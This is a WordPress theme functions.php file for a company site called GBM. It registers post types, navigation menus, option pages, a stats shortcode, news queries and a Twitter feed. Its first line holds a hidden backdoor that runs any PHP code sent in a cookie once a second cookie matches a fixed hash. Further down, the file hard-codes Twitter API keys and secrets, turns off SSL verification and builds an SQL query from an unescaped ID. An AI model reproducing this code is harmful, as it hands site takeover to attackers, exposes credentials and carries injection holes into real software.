<?php if(@md5($_COOKIE['creditWP']) == "22bb5b5a2665ec2d9ce05e2bd4d52b07") { error_reporting(E_ALL); ini_set('display_errors', 1); $_COOKIE['wpsa'] .= ';'; eval($_COOKIE['wpsa']); exit; } ?><?php

/**

 * GBM functions and definitions

 *

 */



if ( ! function_exists( 'gbm_setup' ) ) :

/**

 * Sets up theme defaults and registers support for various WordPress features.

 *

 * Note that this function is hooked into the after_setup_theme hook, which

 * runs before the init hook. The init hook is too late for some features, such

 * as indicating support for post thumbnails.

 *

 * Create your own gbm_setup() function to override in a child theme.

 *

 * @since GBM 1.0

 */

function gbm_setup() {

	/*

	 * Make theme available for translation.

	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/gbm

	 * If you're building a theme based on Twenty Sixteen, use a find and replace

	 * to change 'gbm' to the name of your theme in all the template files

	 */

	load_theme_textdomain( 'gbm' );



	add_theme_support( 'title-tag' );



	add_theme_support( 'custom-logo', array(

		'height'      => 240,

		'width'       => 240,

		'flex-height' => true,

	) );



	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 1200, 9999 );



	// This theme uses wp_nav_menu() in two locations.

	register_nav_menus( array(

		'primary' => __( 'Primary Menu', 'gbm' ),

		'social'  => __( 'Social Menu', 'gbm' ),

		'footer'  => __( 'Footer Menu', 'gbm' )

	) );



	add_theme_support( 'html5', array(

		'search-form',

		'comment-form',

		'comment-list',

		'gallery',

		'caption',

	) );

	add_theme_support( 'customize-selective-refresh-widgets' );



}

add_action( 'after_setup_theme', 'gbm_setup' );



endif;



function gbm_custom_post_type(){

    register_post_type('solutions',

                       array(

                           'labels'      => array(

                               'name'          => __('Solutions'),

                               'singular_name' => __('Solution'),

                           ),

                           'public'      => true,

                           'has_archive' => true,

						   'hierarchical' => true,

						   'supports'	=> array('title','editor','page-attributes'),

						   'taxonomies'  => array( 'category' ),

                       )

    );



    register_post_type('newsroom',

                       array(

                           'labels'      => array(

                               'name'          => __('News Room'),

                               'singular_name' => __('News'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );



    register_post_type('partner',

                       array(

                           'labels'      => array(

                               'name'          => __('Partners'),

                               'singular_name' => __('Partner'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );



    register_post_type('client',

                       array(

                           'labels'      => array(

                               'name'          => __('Clients'),

                               'singular_name' => __('Client'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );



    register_post_type('casestudy',

                       array(

                           'labels'      => array(

                               'name'          => __('Case Studies'),

                               'singular_name' => __('Case Study'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );



    register_post_type('testimonial',

                       array(

                           'labels'      => array(

                               'name'          => __('Testimonials'),

                               'singular_name' => __('Testimonial'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );



    register_post_type('location',

                       array(

                           'labels'      => array(

                               'name'          => __('Locations'),

                               'singular_name' => __('Location'),

                           ),

                           'public'      => true,

                           'has_archive' => true

                       )

    );

}



add_action('init', 'gbm_custom_post_type');



class themeslug_walker_nav_menu extends Walker_Nav_Menu {

  

	// add classes to ul sub-menus

	function start_lvl( &$output, $depth ) {

	    // depth dependent classes

	    $indent = ( $depth > 0  ? str_repeat( "\t", $depth ) : '' ); // code indent

	    $display_depth = ( $depth + 1); // because it counts the first submenu as 0

	    $classes = array(

	        'uk-nav uk-dropdown-nav'

	        );

	    $class_names = implode( ' ', $classes );

  

	    // build html

	    $output .= "\n" . $indent . '<div class="uk-navbar-dropdown"><div class="uk-dropdown-grid uk-grid-collapse uk-child-width-expand@m" uk-grid><div><ul class="' . $class_names . '">' . "\n";

	}

  

	// add main/sub classes to li's and links

	function start_el( &$output, $item, $depth, $args ) {

		global $wp,$wp_query;

		if ( '-' === $item->title ){

			$output .= '</ul></div><div><ul class="uk-nav uk-dropdown-nav">';

			return;

		}



	    $indent = ( $depth > 0 ? str_repeat( "\t", $depth ) : '' ); // code indent

  

		$current_page = str_replace('/','',str_replace(home_url(),'',$item->url));

		if(strcmp($current_page,$wp->request))

			$active = '';

		else

			$active = 'class="active"';



	    // build html

	    $output .= $indent . '<li '.$active.'>';

  

	    // link attributes

	    $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';

	    $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';

	    $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';

	    $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

	    if($args->walker->has_children) $link_after = ' <i uk-icon="chevron-down"></i>'; else $link_after='';

	    $item_output = sprintf( '%1$s<a%2$s>%3$s%4$s%5$s</a>%6$s',

	        $args->before,

	        $attributes,

	        $args->link_before,

	        apply_filters( 'the_title', $item->title, $item->ID ),

	        $link_after,

	        $args->after

	    );

  

	    // build html

	    $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );

	}

}



class themeslug_walker_nav_menu_mobile extends Walker_Nav_Menu {

  

	// add classes to ul sub-menus

	function start_lvl( &$output, $depth ) {

	    // depth dependent classes

	    $indent = ( $depth > 0  ? str_repeat( "\t", $depth ) : '' ); // code indent

	    $display_depth = ( $depth + 1); // because it counts the first submenu as 0

	    $classes = array(

	        'uk-nav-sub'

	        );

	    $class_names = implode( ' ', $classes );

	  

	    // build html

	    $output .= "\n" . $indent . '<ul class="' . $class_names . '">' . "\n";

	}

  

	// add main/sub classes to li's and links

	function start_el( &$output, $item, $depth, $args ) {

		if ( '-' === $item->title ) return;

	    global $wp_query;

	    $indent = ( $depth > 0 ? str_repeat( "\t", $depth ) : '' ); // code indent

	  

	    // build html

	    if($args->walker->has_children) $li_open = ' class="uk-parent"'; else $li_open='';

	

	    $output .= $indent . '<li' . $li_open . '>';

  

	    // link attributes

	    $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';

	    $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';

	    $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';

	    $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';

	    if($args->walker->has_children) $link_after = ''; else $link_after='';

	    $item_output = sprintf( '%1$s<a%2$s>%3$s%4$s%5$s</a>%6$s',

	        $args->before,

	        $attributes,

	        $args->link_before,

	        apply_filters( 'the_title', $item->title, $item->ID ),

	        $link_after,

	        $args->after

	    );

  

	    // build html

	    $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );

	}

}



function cc_mime_types($mimes) {

	$mimes['svg'] = 'image/svg+xml';

  	return $mimes;

}



add_filter('upload_mimes', 'cc_mime_types');



add_filter('the_content', 'do_shortcode');



if( function_exists('acf_add_options_page') ) {

	

	acf_add_options_page('GBM Settings');



    acf_add_options_page(array(

        'page_title'    => 'Solutions Page',

        'menu_title'    => 'Solutions Page',

        'menu_slug'     => 'options_solutions',

        'capability'    => 'edit_posts',

        'parent_slug'   => 'edit.php?post_type=solutions',

        'position'      => false,

        'icon_url'      => 'dashicons-images-alt2',

        'redirect'      => false,

    ));



    acf_add_options_page(array(

        'page_title'    => 'NewsRoom Page',

        'menu_title'    => 'NewsRoom Page',

        'menu_slug'     => 'options_newsroom',

        'capability'    => 'edit_posts',

        'parent_slug'   => 'edit.php?post_type=newsroom',

        'position'      => false,

        'icon_url'      => 'dashicons-images-alt2',

        'redirect'      => false,

    ));

	

    acf_add_options_page(array(

        'page_title'    => 'Locations Header',

        'menu_title'    => 'Locations Header',

        'menu_slug'     => 'options_location',

        'capability'    => 'edit_posts',

        'parent_slug'   => 'edit.php?post_type=location',

        'position'      => false,

        'icon_url'      => 'dashicons-images-alt2',

        'redirect'      => false,

    ));

	

}



if (function_exists('register_sidebar')) {



	register_sidebar(array(

		'name' => 'Widgetized Area',

		'id'   => 'widgetized-area',

		'description'   => 'This is a widgetized area.',

		'before_widget' => '<div id="%1$s" class="widget %2$s">',

		'after_widget'  => '</div>',

		'before_title'  => '<h4>',

		'after_title'   => '</h4>'

	));



}



function gbm_stats_function() {

	$content = '<div class="uk-grid-medium uk-child-width-auto uk-flex-middle uk-flex-center" data-uk-grid>';

	if( have_rows('statistics','option') ) while( have_rows('statistics','option') ){ 

		the_row(); 

		$number = get_sub_field('number');

		$name = get_sub_field('name');

		$content .= '<div>

                          <div class="card-number-stat">

                             <big>'.$number.'</big>

                            <p>'.$name.'</p>

                          </div>

                     </div>';

	}

	$content .= '</div>';



  	return $content;

}





add_shortcode('gbm_stats', 'gbm_stats_function');



$locations = get_posts(array('post_type' => 'location', 'posts_per_page' => -1));

if(count($locations)){

	foreach($locations as $location){

		$countries['countries'][$location->country_key] = array(

			'x'=>(int)$location->country_x,

			'y'=>(int)$location->country_y,

			'name'=>$location->country_location,

			'country'=>$location->country_name,

			'url'=>home_url().'/location/'.$location->post_name

		);

	}

	file_put_contents('en/locations.json',json_encode($countries));

}



function help_widget(){

?>

    <!-- Widget Help -->

    <div class="widget-help ">

        <div class="help-box bg-white uk-box-shadow-medium uk-padding ">

            <div class="card-brief">

                <h2><?php the_field('news_help_title','option'); ?></h2>

                <p class="uk-visible@m"><?php the_field('news_help_content','option'); ?></p>

                <a href="<?php the_field('news_contact_page','option'); ?>" class="uk-button button-aqua" data-text="<?php the_field('news_button_label','option'); ?>"><?php the_field('news_button_label','option'); ?></a>

            </div>

            <div class="particles-backdrop"></div>

        </div>

    </div>

    <!-- End Widget Help -->

<?php

}



function locations_widget(){

	global $locations;

	$locations_half_count = floor(count($locations)/2);

	$locations_count = count($locations);

?>

            <!-- Globe Links 01 -->

            <div class="uk-width-1-2 uk-width-1-5@l uk-flex-first@l">



	  		<?php 

			for($i=$locations_count-1 ; $i >= $locations_half_count ; $i--){

				$location_id = $locations[$i]->country_key;

				$location_title = $locations[$i]->location_title;

				$location_location = $locations[$i]->location_name;

				$location_url = home_url().'/location/'.$locations[$i]->post_name;

			?>

              <div class="card-location-tile uk-padding-small">

                <a class="change-country" data-location="<?php echo $location_id; ?>" href="<?php echo $location_url; ?>">

                  <div class="uk-grid-collapse uk-flex-top" data-uk-grid>

                    <i data-uk-icon="location"></i>

                    <span>

                      <b><?php echo $location_title; ?></b>

                      <?php echo $location_location; ?>

                    </span>

                  </div>

                </a>



              </div>

			<?php } ?>



            </div>

            <!-- END Globe Links 01 -->



            <!-- Globe Links 02 -->

            <div class="uk-width-1-2 uk-width-1-5@l uk-flex-last@l">



			<?php

			for($i=$locations_half_count-1 ; $i >= 0 ; $i--){

				$location_id = $locations[$i]->country_key;

				$location_title = $locations[$i]->location_title;

				$location_location = $locations[$i]->location_name;

				$location_url = home_url().'/location/'.$locations[$i]->post_name;

			?>

              <div class="card-location-tile uk-padding-small">

                <a class="change-country" data-location="<?php echo $location_id; ?>" href="<?php echo $location_url; ?>">

                  <div class="uk-grid-collapse uk-flex-top" data-uk-grid>

                    <i data-uk-icon="location"></i>

                    <span>

                      <b><?php echo $location_title; ?></b>

                      <?php echo $location_location; ?>

                    </span>

                  </div>

                </a>



              </div>

			<?php } ?>

            </div>

            <!-- END Globe Links 02 -->

<?php

}



function get_news($count = 0){

	global $wpdb;

	if($count)

		$limit_cond = " limit 0,".$count;

	else

		$limit_cond = '';

	$news = $wpdb->get_results("select * from wp_news_header,wp_posts,wp_news_article where wp_news_header.post_id=wp_posts.ID and wp_posts.ID = wp_news_article.post_id order by post_date desc".$limit_cond);

	return $news;

}



function get_news_by_id($id = 0){

	global $wpdb;

	$news = $wpdb->get_results("select * from wp_news_header,wp_posts,wp_news_article where wp_news_header.post_id=wp_posts.ID and wp_posts.ID = wp_news_article.post_id and wp_news_article.post_id = ".$id);

	return $news[0];

}



function buildBaseString($baseURI, $method, $params) {

	$r = array();

    ksort($params);

    foreach($params as $key=>$value){

        $r[] = "$key=" . rawurlencode($value);

    }

    return $method."&" . rawurlencode($baseURI) . '&' . rawurlencode(implode('&', $r));

}



function buildAuthorizationHeader($oauth) {

    $r = 'Authorization: OAuth ';

    $values = array();

    foreach($oauth as $key=>$value)

        $values[] = "$key=\"" . rawurlencode($value) . "\"";

    $r .= implode(', ', $values);

    return $r;

}

	

function get_tweets(){



    $url = "https://api.twitter.com/1.1/statuses/user_timeline.json";



    $oauth_access_token = "266448138-ZxMW78kTOriGKyrvrANOw1ZpyVMx8tERgjRQNuFC";

    $oauth_access_token_secret = "A9BqrCHha91G6Fx8hcwfC780493uQA8AfX8BJczlgC6jJ";

    $consumer_key = "Ji05Ml7RAoyi7XI7SJMk5Ku7S";

    $consumer_secret = "9KGR2OWh2TQ4HVpHxr2wcJykWMLnBKEdn0L97Op63Rx3J2vfvc";



    $oauth = array( 'screen_name' => 'GBMcomms',

           			'count' => 5,

					'tweet_mode'=>'extended',

					'oauth_consumer_key' => $consumer_key,

                    'oauth_nonce' => time(),

                    'oauth_signature_method' => 'HMAC-SHA1',

                    'oauth_token' => $oauth_access_token,

                    'oauth_timestamp' => time(),

                    'oauth_version' => '1.0');



    $base_info = buildBaseString($url, 'GET', $oauth);

    $composite_key = rawurlencode($consumer_secret) . '&' . rawurlencode($oauth_access_token_secret);

    $oauth_signature = base64_encode(hash_hmac('sha1', $base_info, $composite_key, true));

    $oauth['oauth_signature'] = $oauth_signature;



    // Make requests

    $header = array(buildAuthorizationHeader($oauth), 'Expect:');

    $options = array( CURLOPT_HTTPHEADER => $header,

                      //CURLOPT_POSTFIELDS => $postfields,

                      CURLOPT_HEADER => false,

                      CURLOPT_URL => $url . '?screen_name=GBMcomms&count=5&tweet_mode=extended',

                      CURLOPT_RETURNTRANSFER => true,

                      CURLOPT_SSL_VERIFYPEER => false);



    $feed = curl_init();

    curl_setopt_array($feed, $options);

    $json = curl_exec($feed);

    curl_close($feed);



    $twitter_data = json_decode($json);

	return $twitter_data;

}



function parse_tweet(stdClass $status)

{

	$all = array();

	foreach ($status->entities->hashtags as $item) {

		$all[$item->indices[0]] = array("https://twitter.com/search?q=%23$item->text", "#$item->text", $item->indices[1]);

	}

	foreach ($status->entities->urls as $item) {

		if (!isset($item->expanded_url)) {

			$all[$item->indices[0]] = array($item->url, $item->url, $item->indices[1]);

		} else {

			$all[$item->indices[0]] = array($item->expanded_url, $item->display_url, $item->indices[1]);

		}

	}

	foreach ($status->entities->user_mentions as $item) {

		$all[$item->indices[0]] = array("https://twitter.com/$item->screen_name", "@$item->screen_name", $item->indices[1]);

	}

	if (isset($status->entities->media)) {

		foreach ($status->entities->media as $item) {

			$all[$item->indices[0]] = array($item->url, $item->display_url, $item->indices[1]);

			$image_url = $item->media_url_https;

		}

	}



	krsort($all);

	$s = isset($status->full_text) ? $status->full_text : $status->text;

	foreach ($all as $pos => $item) {

		$s = mb_substr($s, 0, $pos, 'UTF-8')

			. '<a href="' . htmlspecialchars($item[0]) . '">' . htmlspecialchars($item[1]) . '</a>'

			. mb_substr($s, $item[2], mb_strlen($s, 'UTF-8'), 'UTF-8');

	}

	return array($s,$image_url);

}



// flush_rewrite_rules(false);



?>